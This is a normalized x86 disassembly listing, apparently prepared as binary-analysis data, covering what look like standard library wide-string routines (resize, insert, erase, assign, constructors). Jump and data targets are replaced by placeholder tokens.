push ebx
mov ecx esi
call sub_1003a5cd
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_1003a5cd
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1003b6da
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
movzx eax [ esi ]
push edi
push 0x0
push eax
call sub_1003a3ed
movzx eax ax
add esp 0xc
push eax
lea ecx [ ebp + 0x10 ]
call sub_1003b2bd
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop edi
pop esi
sub_1003b727
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1003b6da
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
push 0x1
push [ ebp + 0x20 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1003b31f
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_100208d0
add esp 0xc
test eax eax
je r-xdata
sub_1003b7bb
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
lea ecx [ ebp + 0x14 ]
call sub_1003aed5
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b2bd
dec [ ebp + 0x1c ]
lea ecx [ ebp + 0x14 ]
call sub_1003b046
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_1003b7f7
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_1003b2bd
dec [ ebp + 0x18 ]
jne r-xdata
sub_1003b822
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1003ad21
add esp 0xc
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
sub_1003b86f
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x18 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
jb r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
pop ebp
retn 0x4
sub_1003b892
push 0x10
mov eax sub_10047cc9
call sub_10023e66
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_1000762b
mov ecx [ eax ]
lea ebx [ esi + 0x2c ]
mov [ ebx ] ecx
mov eax [ eax + 0x4 ]
mov [ ebx + 0x4 ] eax
call sub_100208a9
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10006a1a
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_1003a41b
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_1003a41b
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_1003a41b
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_1003a3ed
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_1003a3ed
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
jl r-xdata
call sub_10023f0b
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_10026940
push 0x4
push esi
push [ ebp + 0x8 ]
call sub_10026940
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_1003a5cd
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_1003a5cd
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1003b9f8
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_1003b24c
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_1003ba21
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_100078d1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov ax [ esi + 0x6 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_1003ba9a
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ada5
add esp 0x14
leave
retn
sub_1003bab9
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003ae78
add esp 0x14
leave
retn
sub_1003bad8
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] bl
jne r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] bl
jne r-xdata
call sub_1003ba21
cmp [ edi ] ebx
jne r-xdata
mov ecx esi
call sub_1003ba21
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_1003bb17
push 0x4
mov eax sub_100488b7
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_1003b34a
mov eax esi
call sub_10023f0b
retn 0xc
sub_1003bb65
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003bb4d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003bb86
push 0x4
mov eax sub_100488b7
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x14 ]
mov al [ ebp + 0x10 ]
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x28 ] al
call sub_1003b574
mov eax esi
call sub_10023f0b
retn 0x10
sub_1003bbc2
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_1003ba6b
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_1003bbe6
push 0x4
mov eax sub_100488b7
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x14 ]
mov al [ ebp + 0x10 ]
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x28 ] al
call sub_1003b892
mov eax esi
call sub_10023f0b
retn 0x10
sub_1003bc22
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1003b4af
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_1003bc67
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ esi + 0x14 ]
sub eax edi
cmp eax [ ebp + 0xc ]
jae r-xdata
call sub_1001b037
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov [ ebp + 0xc ] eax
pop edi
mov eax esi
pop esi
leave
retn 0x8
mov ecx [ esi + 0x18 ]
push ebx
lea edx [ esi + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov [ ebp + 0x8 ] edx
mov ebx [ edx ]
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov ebx [ ebp + 0xc ]
sub eax ebx
push eax
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
lea eax [ edi + ebx ]
lea eax [ edx + eax * 2 ]
push eax
mov eax [ ebp - 0x4 ]
sub ecx edi
push ecx
lea eax [ eax + edi * 2 ]
push eax
call sub_1003bab9
mov eax [ esi + 0x14 ]
add esp 0x10
sub eax ebx
push eax
mov ecx esi
call sub_1003b86f
pop ebx
mov edx [ edx ]
cmp ecx 0x8
jb r-xdata
sub_1003bce9
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
mov ecx [ ebp + 0x8 ]
push eax
call sub_1003ba6b
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_1003bd13
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
push [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x18 ] 0x7
call sub_1003b86f
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ ebp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
push edi
mov edi [ eax ]
jbe r-xdata
push edi
call sub_1002004f
pop ecx
pop edi
push [ ebp + 0xc ]
push edi
push 0x8
push eax
call sub_1003ba9a
add esp 0x10
sub_1003bd60
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1001da40
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_1003bd8f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1003b116
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_1003bdbe
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
neg eax
push eax
lea ecx [ ebp - 0x8 ]
call sub_1003b116
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_1003bdf0
push 0xc
mov eax sub_10047ce4
call sub_10023e66
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax esi
pop ebx
div ebx
mov ecx [ edi + 0x18 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp eax edx
jae r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push eax
mov ecx edi
call sub_1003ba85
mov ebx eax
jmp r-xdata
mov eax 0x7ffffffe
sub eax edx
cmp ecx eax
ja r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
lea esi [ edx + ecx ]
push 0x0
push 0x1
mov ecx edi
call sub_1003bd13
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x18 ] esi
call sub_1003b86f
call sub_10023f0b
retn 0x8
cmp [ edi + 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push [ ebp + 0xc ]
push eax
lea eax [ esi + 0x1 ]
push eax
push ebx
call sub_1003ba9a
add esp 0x10
sub_1003beef
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003bb86
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1003bf14
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003acb2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003bf3b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003bb86
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1003bf60
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003acb2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003bf87
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003bbe6
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1003bfac
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003b179
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003bfd3
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x10 ]
mov esi ecx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003bbe6
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1003bff8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003b179
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1003c059
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0x7ffffffe
jbe r-xdata
cmp [ esi + 0x18 ] edi
jae r-xdata
call sub_1001afff
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ esi + 0x14 ]
mov ecx esi
push edi
call sub_1003bdf0
jmp r-xdata
test edi edi
jne r-xdata
cmp edi 0x8
jae r-xdata
xor eax eax
cmp eax edi
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
push edi
mov ecx esi
call sub_1003b86f
mov eax [ esi + 0x14 ]
cmp edi eax
jae r-xdata
push eax
push 0x1
mov ecx esi
call sub_1003bd13
jmp r-xdata
mov eax edi
sub_1003c0d7
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ edi + 0x14 ] ebx
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
mov ebx [ ebp + 0x10 ]
cmp eax ebx
jae r-xdata
call sub_1001b037
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0x10 ] ebx
call sub_1001afff
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_1003c059
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
lea edi [ edi + ebx * 2 ]
sub eax ecx
push edi
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_1003ba9a
add esp 0x10
push [ ebp + 0x8 ]
mov ecx esi
call sub_1003b86f
sub_1003c19b
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
or eax 0xffffffff
mov edi ecx
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_1001afff
mov eax edi
pop edi
pop ebx
pop ebp
retn 0x8
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_1003c059
test al al
je r-xdata
pop esi
push [ ebp + 0xc ]
mov ecx edi
push ebx
push [ edi + 0x14 ]
call sub_1003b822
push esi
mov ecx edi
call sub_1003b86f
sub_1003c1ed
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
call sub_1001b037
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_1001afff
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0xc ]
push 0x0
push ebx
mov ecx esi
call sub_10001fc4
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x8
jb r-xdata
mov [ ebp + 0x8 ] ecx
mov edx [ ecx ]
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp + 0x8 ]
lea edx [ edx + edi * 2 ]
push edx
mov edx [ ebp + 0xc ]
sub eax edi
sub eax edx
push eax
lea eax [ edi + edx ]
lea eax [ ecx + eax * 2 ]
push eax
call j_sub_10001def
add esp 0x10
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_10005e6c
push ebx
mov ecx esi
call sub_10002579
mov ecx [ ecx ]
cmp eax 0x8
jb r-xdata
sub_1003c28d
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10005c07
push 0xffffffff
push eax
call sub_10001e10
jmp r-xdata
pop ebp
retn 0x8
sub_1003c2b5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ edi + 0x14 ] eax
jae r-xdata
mov esi [ edi + 0x14 ]
mov eax [ ebp + 0xc ]
sub esi eax
cmp [ ebp + 0x10 ] esi
jae r-xdata
call sub_1001b037
mov ecx ebx
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
push 0x0
push esi
call sub_1003c059
test al al
je r-xdata
push 0xffffffff
add esi eax
push esi
call sub_1003bc67
push [ ebp + 0xc ]
mov ecx ebx
push 0x0
call sub_1003bc67
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0x18 ]
cmp ecx 0x8
jb r-xdata
mov edx [ ebp + 0xc ]
push esi
lea edx [ edi + edx * 2 ]
push edx
push ecx
push eax
call sub_1003ba9a
add esp 0x10
push esi
mov ecx ebx
call sub_1003b86f
sub_1003c34a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_1003b0d7
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
mov ecx esi
call sub_1003c059
test al al
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esi + 0x18 ]
cmp ecx 0x8
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_1003c2b5
jmp r-xdata
push [ ebp + 0xc ]
push edi
push ecx
push eax
call sub_1003ba9a
add esp 0x10
push [ ebp + 0xc ]
mov ecx esi
call sub_1003b86f
sub_1003c3c0
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10020428
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_1003c34a
pop esi
pop ebp
retn 0x4
sub_1003c3e1
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_1003c059
test al al
je r-xdata
call sub_1001afff
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx esi
push edi
push 0x0
call sub_1003b822
push edi
mov ecx esi
call sub_1003b86f
sub_1003c422
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
call sub_1001b037
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_1001afff
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0xc ]
push 0x0
push ebx
mov ecx esi
call sub_1003c059
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x8
jb r-xdata
mov [ ebp + 0x8 ] ecx
mov edx [ ecx ]
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp + 0x8 ]
lea edx [ edx + edi * 2 ]
push edx
mov edx [ ebp + 0xc ]
sub eax edi
sub eax edx
push eax
lea eax [ edi + edx ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1003bab9
add esp 0x10
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_1003b822
push ebx
mov ecx esi
call sub_1003b86f
mov ecx [ ecx ]
cmp eax 0x8
jb r-xdata
sub_1003c4c2
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_1003c19b
push 0xffffffff
push eax
call sub_1003bc67
jmp r-xdata
pop ebp
retn 0x8
sub_1003c4ea
push 0x38
mov eax sub_10047d07
call sub_10023e9c
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0xc ]
xor edx edx
mov [ ebp - 0x44 ] eax
test cx cx
je r-xdata
push 0x0
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
call sub_10005ad1
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x40 ] 0xfffffffe
mov [ ebp - 0x38 ] 0x1
movzx eax cx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
mov eax [ ebp - 0x40 ]
call sub_10023f1f
retn
movzx eax [ esi + edi * 2 ]
test ax ax
je r-xdata
inc edx
movzx eax [ esi + edx * 2 ]
test ax ax
jne r-xdata
inc [ ebp + 0x10 ]
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
cmp [ eax ] 0x0
je r-xdata
movzx ecx [ esi ]
cmp ax cx
jne r-xdata
add edi [ ebp - 0x38 ]
movzx eax [ esi + edi * 2 ]
cmp ax [ esi ]
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
movsx eax [ eax ]
add edi eax
jmp r-xdata
inc edi
movzx eax [ esi + edi * 2 ]
test ax ax
jne r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
test ax ax
je r-xdata
inc [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ax cx
je r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov [ eax ] bl
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x40 ] eax
mov ebx [ ebp - 0x38 ]
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_1003bad8
test al al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
push 0x7f
pop ebx
cmp [ ebp - 0x38 ] ebx
jae r-xdata
mov ecx [ ebp - 0x3c ]
call sub_1003bc51
cmp [ esi + edi * 2 ] ax
jne r-xdata
push [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
call sub_1003bad8
test al al
jne r-xdata
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
call sub_10005bdf
mov [ eax ] bl
jmp r-xdata
